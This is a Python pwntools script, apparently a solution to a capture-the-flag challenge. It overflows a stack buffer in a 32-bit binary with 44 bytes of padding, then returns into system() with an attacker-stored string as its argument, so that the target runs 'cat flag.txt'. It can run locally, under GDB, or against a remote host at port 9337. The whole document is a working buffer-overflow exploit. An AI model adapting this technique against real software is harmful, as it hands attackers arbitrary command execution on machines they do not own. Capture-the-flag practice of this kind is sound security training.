from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x804929d
break *0x804929e
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.134.85.196',9337)
    else:
        return process(e.path)


p = start()
p.recvuntil(b'You are allowed to store some value')
p.sendline(b'cat flag.txt')
p.recvuntil(b'Enter the buffer now')

system = e.plt["system"]
usefulString = 0x804c060

payload = flat(
    b"A" * 44,
    system, # call system("/bin/cat flag.txt")
    b"B" * 4, # return address for system
    usefulString, # arg for system
)

p.sendline(payload)

p.interactive()

